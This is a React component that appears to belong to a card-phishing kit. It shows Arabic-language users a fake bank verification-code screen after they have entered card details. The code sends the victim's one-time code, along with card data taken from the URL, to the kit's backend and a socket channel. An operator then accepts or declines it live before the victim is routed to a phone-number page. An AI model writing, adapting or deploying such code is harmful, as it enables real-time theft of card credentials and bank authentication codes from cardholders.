import React, { useEffect, useState, useMemo, useCallback } from "react";
import { api_route, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
import { scrollToTop } from "../utils/scroll";

/**
 * OTP step after card approval — same visual language as reference PaymentForm OTP flow (no PIN).
 */
const Verify = () => {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);
  const navigate = useNavigate();

  const search = window.location.search;
  const data = useMemo(() => {
    try {
      const q = new URLSearchParams(search);
      const raw = q.get("data");
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }, [search]);

  const _id = data?._id;

  const handleOtp = async (e) => {
    e.preventDefault();
    if (!_id) return;
    setLoad(true);
    setError(false);
    const finalData = { ...data, otp };
    try {
      await axios.post(`${api_route}/visaOtp/${_id}`, finalData);
      socket.emit("visaOtp", { id: _id, otp });
    } catch {
      setLoad(false);
    }
  };

  const onAcceptVisaOtp = useCallback(
    (id) => {
      if (id !== _id) return;
      scrollToTop();
      setLoad(false);
      sessionStorage.setItem("id", id);
      navigate(`/phone?id=${id}`);
    },
    [_id, navigate]
  );

  const onDeclineVisaOtp = useCallback(
    (id) => {
      if (id !== _id) return;
      scrollToTop();
      setLoad(false);
      setError(true);
    },
    [_id]
  );

  useEffect(() => {
    socket.on("acceptVisaOtp", onAcceptVisaOtp);
    socket.on("declineVisaOtp", onDeclineVisaOtp);
    return () => {
      socket.off("acceptVisaOtp", onAcceptVisaOtp);
      socket.off("declineVisaOtp", onDeclineVisaOtp);
    };
  }, [onAcceptVisaOtp, onDeclineVisaOtp]);

  if (!data || !_id) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        Invalid Data
      </div>
    );
  }

  const digits = (data.cardNumber || "").replace(/\s/g, "");
  const showVisa = digits.startsWith("4");
  const showMc = digits.startsWith("5");

  return (
    <div
      className="w-full items-center justify-center flex flex-col bg-white lg:w-1/3 md:w-2/3 py-2 min-h-screen"
      dir="rtl"
    >
      {load && (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-[#00000048]">
          <div className="flex flex-col items-center gap-6 bg-white p-8 w-3/4 rounded-md">
            {showVisa ? (
              <img
                src="data:image/svg+xml;charset=utf-8,%3Csvg width='120' height='80' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='120' height='80' rx='8' fill='%23fff'/%3E%3Cpath d='m49.893 26.24-11.598 28.224h-6.892l-5.708-22.173c-.345-1.385-.648-1.896-1.703-2.477-1.725-.944-4.574-1.829-7.073-2.378l.17-.817h12.192c1.551 0 2.95 1.053 3.302 2.877l3.015 16.31 7.455-19.2 7.528-.006zm29.679 19.022c.031-7.443-10.107-7.857-10.038-11.18.023-1.009.97-2.087 3.04-2.36 1.023-.136 3.85-.239 7.055 1.26l1.256-5.98c-1.725-.63-3.946-1.235-6.71-1.235-7.08 0-12.066 3.832-12.108 9.312-.048 4.058 3.554 6.325 6.267 7.675 2.794 1.38 3.732 2.273 3.719 3.503-.019 1.888-2.224 2.726-4.288 2.758-3.599.058-5.688-.994-7.353-1.783l-1.296 6.177c1.674.781 4.767 1.463 7.965 1.502 7.532.003 12.458-3.786 12.488-9.648zm18.71 9.206h7.302l-6.152-28.224h-6.113c-1.378 0-2.532.812-3.048 2.067l-10.747 26.157h7.522l1.492-4.212h9.189l.865 4.212zm-7.99-9.984 3.77-10.59 2.173 10.59h-5.943zm-30.152-18.24-5.923 28.224h-7.166l5.923-28.224h7.166Z' fill='%231434CB'/%3E%3Crect x='1' y='1' width='118' height='78' rx='7' stroke='%23DFE5EB' stroke-width='2'/%3E%3C/svg%3E"
                alt="Visa"
                className="w-32 h-auto"
              />
            ) : showMc ? (
              <img
                src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                alt="Mastercard"
                className="w-32 h-auto"
              />
            ) : (
              <img src="/mada.png" alt="" className="h-16" />
            )}
            <TailSpin
              height="40"
              width="40"
              color="#2563eb"
              ariaLabel="loading"
            />
            <span className="text-gray-700 font-medium">يتم التحقق...</span>
          </div>
        </div>
      )}

      <div className="w-full flex flex-col items-center justify-center p-4">
        <form
          className="bg-white border border-gray-300 rounded-lg p-6 py-10 w-full max-w-md"
          dir="rtl"
          onSubmit={handleOtp}
        >
          <h2 className="font-bold text-2xl text-center text-gray-800 mb-2">
            رمز التحقق
          </h2>
          <p className="text-center text-sm font-semibold text-gray-700 mb-6 leading-relaxed">
            تم إرسال رمز التحقق إلى هاتفك المرتبط بالبطاقة. الرجاء إدخال الرمز
            للمتابعة.
          </p>


          <div className="flex justify-center gap-3 my-8" dir="ltr">
            <input
              type="text"
              inputMode="numeric"
              minLength={4}
              maxLength={8}
              dir="ltr"
              value={otp}
              onChange={(e) =>
                setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))
              }
              required
              className="w-full max-w-xs px-4 py-3 border-2 border-gray-400 rounded-lg text-center text-2xl font-bold tracking-widest focus:border-blue-500 focus:outline-none bg-white"
              placeholder="••••••"
            />
          </div>

          {error ? (
            <div className="w-full text-center text-red-500 mb-4 flex items-center justify-center">
              <div className="bg-red-50 py-4 px-4 w-full rounded-lg border border-red-200 flex flex-col items-center gap-2">
                <AiOutlineCloseCircle className="text-4xl text-red-500" />
                <span className="text-gray-800 text-sm">
                  رمز التحقق غير صحيح — يرجى المحاولة مرة أخرى
                </span>
                <button
                  type="button"
                  className="bg-blue-600 hover:bg-blue-700 text-white w-full py-2 rounded-md mt-2"
                  onClick={() => setError(false)}
                >
                  حاول مرة ثانية
                </button>
              </div>
            </div>
          ) : null}

          <div className="w-full flex items-center justify-center">
            <button
              className="w-full bg-[#007bff] hover:bg-[#0069d9] text-white font-semibold py-3 rounded-lg text-lg transition-colors"
              type="submit"
            >
              تحقق
            </button>
          </div>

          <img
            src="/cards-all.png"
            className="mx-auto pt-8 max-w-[200px]"
            alt=""
            onError={(e) => {
              e.target.style.display = "none";
            }}
          />
        </form>
      </div>
    </div>
  );
};

export default Verify;
